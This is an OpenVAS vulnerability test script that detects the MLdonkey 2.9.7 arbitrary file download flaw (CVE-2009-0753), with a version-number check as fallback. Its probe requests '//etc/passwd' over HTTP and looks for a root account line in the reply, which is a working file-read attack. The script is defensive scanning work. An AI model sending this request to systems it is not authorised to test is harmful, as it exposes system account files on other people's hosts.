###############################################################################
# OpenVAS Vulnerability Test
# $Id: mldonkey_2_9_7_remote.nasl 15 2013-10-27 12:49:54Z jan $
#
# MLdonkey HTTP Request Arbitrary File Download Vulnerability
#
# Authors:
# Michael Meyer
#
# Copyright:
# Copyright (c) 2009 Greenbone Networks GmbH
#
# This program is free software; you can redistribute it and/or modify
# it under the terms of the GNU General Public License version 2
# (or any later version), as published by the Free Software Foundation.
#
# This program is distributed in the hope that it will be useful,
# but WITHOUT ANY WARRANTY; without even the implied warranty of
# MERCHANTABILITY or FITNESS FOR A PARTICULAR PURPOSE.  See the
# GNU General Public License for more details.
#
# You should have received a copy of the GNU General Public License
# along with this program; if not, write to the Free Software
# Foundation, Inc., 51 Franklin St, Fifth Floor, Boston, MA 02110-1301 USA.
###############################################################################

include("revisions-lib.inc");
tag_summary = "MLdonkey is prone to a vulnerability that lets attackers download arbitrary
  files. The issue occurs because the application fails to sufficiently sanitize
  user-supplied input.

  Exploiting this issue will allow an attacker to view arbitrary files within
  the context of the application. Information harvested may aid in launching
  further attacks.

  MLdonkey 2.9.7 is vulnerable; other versions may also be affected.";

tag_solution = "Fixes are available; please see the http://www.nongnu.org/mldonkey/ for more
  information.";


desc = "

  Summary:
  " + tag_summary + "
  Solution:
  " + tag_solution;


if(description)
{
  script_id(100057);
  script_version("$Revision: 15 $");
  script_tag(name:"last_modification", value:"$Date: 2013-10-27 13:49:54 +0100 (Sun, 27 Oct 2013) $");
  script_tag(name:"creation_date", value:"2009-03-17 18:51:21 +0100 (Tue, 17 Mar 2009)");
  script_bugtraq_id(33865);
  script_cve_id("CVE-2009-0753");
  script_tag(name:"cvss_base", value:"5.0");
  script_tag(name:"cvss_base_vector", value:"AV:N/AC:L/Au:N/C:P/I:N/A:N");
  script_tag(name:"risk_factor", value:"Medium");
 
  script_name("MLdonkey HTTP Request Arbitrary File Download Vulnerability");

  script_description(desc);
 
  summary = "Determine if MLdonkey is vulnerable to HTTP Request Arbitrary File Download";
  script_summary(summary);
 
  script_category(ACT_GATHER_INFO);
  script_copyright("This script is Copyright (C) 2009 Greenbone Networks GmbH");
  family = "Peer-To-Peer File Sharing";
  script_family(family);
  script_dependencies("mldonkey_www.nasl");
  script_require_ports("Services/www", 4080);

  if (revcomp(a: OPENVAS_VERSION, b: "6.0+beta5") >= 0) {
    script_tag(name : "solution" , value : tag_solution);
    script_tag(name : "summary" , value : tag_summary);
  }
  script_xref(name : "URL" , value : "http://www.securityfocus.com/bid/33865");
  exit(0);
}

include("http_func.inc");
include("misc_func.inc");
include("http_keepalive.inc");

 port = get_kb_item("MLDonkey/www/port/");
 if(isnull(port))exit(0);

 req = http_get(item:string("//etc/passwd"), port:port);
 buf = http_keepalive_send_recv(port:port, data:req, bodyonly:FALSE);
 if(buf == NULL )exit(0);

 if( egrep(pattern:"root:.*:0:[01]:.*", string: buf) ) {
   security_warning(port:port,data:desc);
   exit(0);

 } else {
   # server allows connections only from localhost by default. So check the version

   version = get_kb_item(string("www/", port, "/MLDonkey/version"));
   if(isnull(version) || version >< "unknown")exit(0);
   
   if(version <= "2.9.7") {
    info  = string("\n\nAccording to its version number ("); 
    info += version;
    info += string(") MLDonkey is\nvulnerable, but seems to be reject connections from "); 
    info += this_host_name();
    info +=  string(".\n\n");

    desc = desc + info; 

    security_warning(port:port,data:desc);
    exit(0);

   }

 }

exit(0);
